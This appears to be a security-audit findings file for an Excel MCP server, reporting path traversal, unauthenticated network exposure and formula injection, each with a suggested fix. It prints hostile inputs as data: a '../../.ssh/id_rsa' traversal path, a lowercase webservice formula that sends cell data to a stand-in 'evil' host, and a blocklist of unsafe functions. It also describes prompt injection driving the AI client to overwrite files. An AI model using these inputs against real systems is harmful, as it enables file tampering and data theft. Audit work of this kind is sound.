@@ -1,0 +1,107 @@
+[
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "src/excel_mcp/server.py",
+  "line": 703,
+  "quote": "wb = load_workbook(full_path, read_only=False)",
+  "message": "Tool input is used as a file path in load_workbook with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed for the network modes; see M001 for stdio.",
+  "source_line": 681,
+  "source_quote": "def get_data_validation_info(",
+  "id": "F001",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 108,
+    "quote": "candidate = os.path.realpath(os.path.join(base, filename))"
+   },
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 110,
+    "quote": "if not _resolved_path_is_within(base, candidate):"
+   }
+  ],
+  "reason": "get_excel_path resolves the real path (following symlinks) and checks containment with os.path.commonpath before every tool uses it, and rejects absolute paths and NUL bytes, so '../' cannot escape EXCEL_FILES_PATH in the SSE/HTTP modes. The stdio mode, where no folder is enforced, is reported separately as M001.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "stdio mode accepts any absolute path: read any workbook, create/overwrite files anywhere",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 316,
+    "quote": "def create_workbook(filepath: str) -> str:"
+   },
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 102,
+    "quote": "return os.path.normpath(filename)"
+   },
+   {
+    "file": "src/excel_mcp/workbook.py",
+    "line": 25,
+    "quote": "wb.save(str(path))"
+   }
+  ],
+  "reason": "In stdio mode (the mode manifest.json launches) EXCEL_FILES_PATH is None and any absolute filepath is accepted, so an injected prompt can create directories and overwrite any file the user can write (e.g. ~/.ssh/authorized_keys or source files replaced by a workbook) and read any .xlsx on disk.",
+  "fix": "Require an allowed root in stdio mode too (EXCEL_FILES_PATH or a configured list of folders) and apply the same realpath + commonpath check; refuse to overwrite files that are not existing .xlsx/.xlsm workbooks.",
+  "id": "M001",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "NETWORK-EXPOSURE",
+  "title": "SSE / streamable-HTTP transports listen on 0.0.0.0 with no authentication",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 70,
+    "quote": "host=os.environ.get(\"FASTMCP_HOST\", \"0.0.0.0\"),"
+   },
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 826,
+    "quote": "mcp.run(transport=\"sse\")"
+   }
+  ],
+  "reason": "In SSE/HTTP mode the server binds all interfaces by default and has no auth, so anyone on the network can call every tool and read, modify or delete all workbooks in EXCEL_FILES_PATH.",
+  "fix": "Default FASTMCP_HOST to 127.0.0.1 and add bearer-token (or OAuth) auth before enabling the network transports.",
+  "id": "M002",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "FORMULA-INJECTION",
+  "title": "Formulas written without effective checks (blocklist is case-sensitive; write_data skips it)",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/excel_mcp/validation.py",
+    "line": 187,
+    "quote": "func_pattern = r\"([A-Z]+)\\(\""
+   },
+   {
+    "file": "src/excel_mcp/validation.py",
+    "line": 189,
+    "quote": "unsafe_funcs = {\"INDIRECT\", \"HYPERLINK\", \"WEBSERVICE\", \"DGET\", \"RTD\"}"
+   },
+   {
+    "file": "src/excel_mcp/server.py",
+    "line": 302,
+    "quote": "result = write_data(full_path, sheet_name, data, start_cell)"
+   }
+  ],
+  "reason": "write_data_to_excel stores any '=...' string as a formula with no check, and apply_formula's blocklist only matches upper-case names ('=webservice(\"https://evil/?\"&A1)' passes) and misses DDE/other functions, so injected text can plant formulas that leak sheet data or trigger DDE when a person opens the file.",
+  "fix": "Write untrusted strings as text (prefix with an apostrophe or set data_type 's'), and validate formulas case-insensitively against an allowlist of functions.",
+  "id": "M003",
+  "quotes_verified": 3
+ }
+]
